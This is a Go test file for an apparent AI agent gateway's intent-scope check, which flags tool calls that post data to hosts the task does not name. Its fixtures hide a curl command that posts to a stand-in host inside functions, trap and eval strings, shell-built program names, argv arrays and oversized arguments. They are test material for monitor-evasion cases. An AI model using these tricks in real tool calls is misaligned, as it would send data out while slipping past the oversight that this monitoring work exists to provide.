// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"encoding/json"
	"strings"
	"testing"
)

// Round 8 (GAP-0491..0494): an incomplete reading is never "no sender". These
// tests use the exported behavior only (intentScopeExceeded), so they run
// against the code before the fix as well.

const (
	int9Task = "run the unit tests"
	int9Send = "curl -s -d x https://unnamed.example/in"
)

func int9Args(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// int9Out is "no sender", "unreadable" (the unknown tier for a send that cannot
// be read), "incomplete" (the unknown tier for text that cannot be read in full)
// or "exceeded" (a send to a destination the task does not name).
func int9Out(task, tool, args string) string {
	switch r := intentScopeExceeded(task, nil, tool, args); {
	case r == "":
		return "none"
	case strings.Contains(r, "unreadable_send"):
		return "unreadable"
	case strings.Contains(r, "incomplete_reading"):
		return "incomplete"
	case strings.Contains(r, "does not name"):
		return "exceeded"
	default:
		return "other:" + r
	}
}

// GAP-0491: actionfacts' answer is trusted only when its status is complete. Any
// other status (ambiguous, partial with commands) also goes through the syntax
// reader, so a value or body the projection dropped is read, and what the reader
// cannot finish is the unknown tier with its own reason.
func TestIntentScopeGAP0491(t *testing.T) {
	for name, tc := range map[string]struct{ tool, args string }{
		"second shell value":      {"run", int9Args(t, map[string]string{"command": "ls", "script": int9Send})},
		"command and cmd":         {"exec", int9Args(t, map[string]string{"cmd": "ls", "command": int9Send})},
		"command and code":        {"run", int9Args(t, map[string]string{"command": "ls", "code": int9Send})},
		"function that is called": {"Bash", int9Args(t, map[string]string{"command": "f() { " + int9Send + "; }; f"})},
		"coprocess":               {"Bash", int9Args(t, map[string]string{"command": "coproc c { " + int9Send + "; }"})},
		"trap string":             {"Bash", int9Args(t, map[string]string{"command": "trap '" + int9Send + "' EXIT"})},
		"eval string":             {"Bash", int9Args(t, map[string]string{"command": "eval \"" + int9Send + "\"", "x": "1"})},
		"root array of commands":  {"Bash", int9Args(t, []string{"ls", int9Send})},
	} {
		if got := int9Out(int9Task, tc.tool, tc.args); got != "unreadable" && got != "exceeded" {
			t.Errorf("%s: %s, want a send that is not read as none", name, got)
		}
	}
	// the same send next to a value the projection did not drop is still named by its host
	if got := int9Out("post to https://unnamed.example/in", "run", int9Args(t, map[string]string{"command": "ls", "script": "echo hi"})); got != "none" {
		t.Errorf("two benign shell values: %s", got)
	}
	// controls: no sender anywhere stays no sender
	for name, tc := range map[string]struct{ tool, args string }{
		"two benign values":           {"run", int9Args(t, map[string]string{"command": "ls", "script": "echo hi"})},
		"function never called, none": {"Bash", int9Args(t, map[string]string{"command": "f() { echo hi; }; f"})},
		"benign trap":                 {"Bash", int9Args(t, map[string]string{"command": "trap 'rm -f /tmp/x' EXIT"})},
	} {
		if got := int9Out(int9Task, tc.tool, tc.args); got != "none" {
			t.Errorf("%s: %s, want none", name, got)
		}
	}
	// a part the reader cannot finish is the unknown tier, never "no sender":
	// a program name and a string the shell builds
	for name, command := range map[string]string{
		"program built by the shell": "C=curl; $C -d x https://unnamed.example/in",
		"trap string built":          "trap \"$ACTION\" EXIT",
		"eval of a variable":         "eval \"$X\"",
	} {
		args := int9Args(t, map[string]string{"command": command, "x": "1"})
		if got := int9Out(int9Task, "run", args); got == "none" {
			t.Errorf("%s: read as no sender", name)
		}
	}
	if got := int9Out(int9Task, "Bash", int9Args(t, map[string]string{"command": "C=curl; $C -d x https://unnamed.example/in"})); got != "incomplete" {
		t.Errorf("a program name the shell builds (partial): %s, want incomplete (reason=incomplete_reading)", got)
	}
}

// GAP-0492: bash runs the statements before a syntax error, so a send on an
// earlier line is read; an error on the send's own line, or on the first line,
// leaves nothing that runs.
func TestIntentScopeGAP0492(t *testing.T) {
	for name, command := range map[string]string{
		"stray fi":            int9Send + "\nfi",
		"unclosed quote":      int9Send + "\necho \"oops",
		"stray paren":         int9Send + "\n)",
		"error two lines on":  "echo hi\n" + int9Send + "\nfi",
		"function then error": "f() { echo a; }\n" + int9Send + "\n}",
	} {
		if got := int9Out(int9Task, "Bash", int9Args(t, map[string]string{"command": command})); got != "unreadable" && got != "exceeded" {
			t.Errorf("%s: %s, a send before a syntax error was not read", name, got)
		}
	}
	for name, command := range map[string]string{
		"benign line, then error":  "echo hi\nfi",
		"error on the send's line": int9Send + "; fi",
		"error on the first line":  "fi\n" + int9Send,
		"unterminated quote":       "curl -d x https://fb.example/ \"unterminated",
	} {
		if got := int9Out(int9Task, "Bash", int9Args(t, map[string]string{"command": command})); got != "none" {
			t.Errorf("%s: %s, want none (the shell runs none of it)", name, got)
		}
	}
}

// GAP-0493: the shell keys are the ones actionfacts reads: an argv array, and a
// program under cmd or command with its words under args.
func TestIntentScopeGAP0493(t *testing.T) {
	argv := []string{"curl", "-s", "-d", "x", "https://unnamed.example/in"}
	if got := int9Out(int9Task, "run", int9Args(t, map[string]any{"argv": argv})); got != "exceeded" {
		t.Errorf("argv array to an unnamed host: %s, want exceeded", got)
	}
	if got := int9Out("post the build to https://unnamed.example/in", "run", int9Args(t, map[string]any{"argv": argv})); got != "none" {
		t.Errorf("argv array to a named host: %s, want none", got)
	}
	for name, args := range map[string]any{
		"exec cmd + args":       map[string]any{"cmd": "curl", "args": argv[1:]},
		"run command + args":    map[string]any{"command": "curl", "args": argv[1:]},
		"command_argv":          map[string]any{"command_argv": argv},
		"command line spelling": map[string]any{"command_line": int9Send},
	} {
		tool := "run"
		if strings.HasPrefix(name, "exec") {
			tool = "exec"
		}
		if got := int9Out(int9Task, tool, int9Args(t, args)); got != "unreadable" && got != "exceeded" {
			t.Errorf("%s: %s, a send was not read", name, got)
		}
	}
	if got := int9Out(int9Task, "run", int9Args(t, map[string]any{"cmd": "ls", "args": []string{"-la", "."}})); got != "none" {
		t.Errorf("a program with benign words: %s, want none", got)
	}
}

// GAP-0494: the 32 KiB precheck must not skip a call the walk reads: a value under
// the empty key is shell text.
func TestIntentScopeGAP0494(t *testing.T) {
	pad := strings.Repeat("p", scopeKeyPrecheckBytes+1)
	for name, args := range map[string]string{
		"empty key":        int9Args(t, map[string]string{"": int9Send, "pad": pad}),
		"nested empty key": int9Args(t, map[string]any{"a": map[string]string{"": int9Send}, "pad": pad}),
	} {
		if got := int9Out(int9Task, "Bash", args); got == "none" {
			t.Errorf("%s past the precheck size: read as no sender", name)
		}
		small := strings.Replace(args, pad, "x", 1)
		if got := int9Out(int9Task, "Bash", small); got == "none" {
			t.Errorf("%s under the precheck size: read as no sender", name)
		}
	}
	if got := int9Out(int9Task, "Bash", int9Args(t, map[string]string{"pad": pad})); got != "none" {
		t.Errorf("a large call with no key: %s", got)
	}
}
